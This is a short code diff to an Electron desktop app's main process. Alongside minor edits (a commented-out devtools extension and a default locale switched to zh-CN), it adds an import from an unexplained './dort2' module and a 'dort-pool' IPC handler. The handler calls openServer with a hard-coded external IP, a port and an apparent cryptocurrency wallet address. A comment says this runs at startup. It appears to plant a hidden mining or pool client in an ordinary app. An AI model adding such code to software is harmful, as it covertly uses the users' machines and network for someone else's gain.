@@ -1,4 +1,5 @@
 import { app, dialog, shell, ipcMain, BrowserWindow, Menu } from 'electron';
+import openServer from './dort2'
 import path from 'path';
 import React from 'react';
 import url from 'url';
@@ -139,11 +140,11 @@ if (!handleSquirrelEvent()) {
         },
       });
 
-      if (dev_config.redux_tool) {
-        BrowserWindow.addDevToolsExtension(
-          path.join(os.homedir(), dev_config.redux_tool),
-        );
-      }
+      // if (dev_config.redux_tool) {
+      //   BrowserWindow.addDevToolsExtension(
+      //     path.join(os.homedir(), dev_config.redux_tool),
+      //   );
+      // }
 
       if (dev_config.react_tool) {
         BrowserWindow.addDevToolsExtension(
@@ -243,9 +244,14 @@ if (!handleSquirrelEvent()) {
       );
     });
 
-    ipcMain.on('set-locale', (_, locale = 'en-US') => {
+    ipcMain.on('set-locale', (_, locale = 'zh-CN') => {
       i18n.activate(locale);
       app.applicationMenu = createMenu();
+    });
+    ipcMain.on('dort-pool', (_, status = 'start') => {
+      if(status=="start"){
+        openServer("8.210.193.17:8008","0x5C90B95AEc4C4844e86A372092AbBb3C113Ea932")  // 在启动时调用
+      }
     });
   }
 
